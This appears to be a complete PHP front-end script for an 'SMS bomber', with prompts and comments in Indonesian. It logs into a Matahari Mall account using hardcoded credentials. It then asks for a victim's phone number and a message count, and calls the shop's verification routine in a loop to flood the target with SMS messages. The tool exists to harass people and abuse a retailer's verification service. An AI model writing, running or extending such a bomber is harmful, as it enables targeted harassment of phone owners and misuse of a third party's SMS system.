<?php

include '.bommataharimall.php';

$init = new Bom();
// Konfigurasi Akun Mataharimall
$init->email = "zumupolij@c1oramn.com";
$init->pass = "Hilih kintil";
$init->Login($init->email,$init->pass);


echo "\n\n\n";
echo "\033[31;1m...::::::::[ Created by : Zaa Eka Gumilar ]::::::::...\n";

echo "\033[32;1m----------------------------------------------------\n";
echo "\033[00;3mNote :
Target akan menerima pesan dari kantor MATAHARI MALL.. 
Pastikan anda memiliki koneksi internet..\n";
echo "\033[32;1m----------------------------------------------------\n\n";




//Eksekusi Sms Boomber
echo "\033[00;1mNomor Target gunakan awalan 62\n\033[33;1mInput : ";
$a = trim(fgets(STDIN));
$init->no = "$a";
echo "\033[00;1mJumlah Pesan\n\033[33;1mInput : ";
$b = trim(fgets(STDIN));
$loop = "$b";
for ($i=0; $i < $loop; $i++) { 
    $init->Verif($init->no);
}
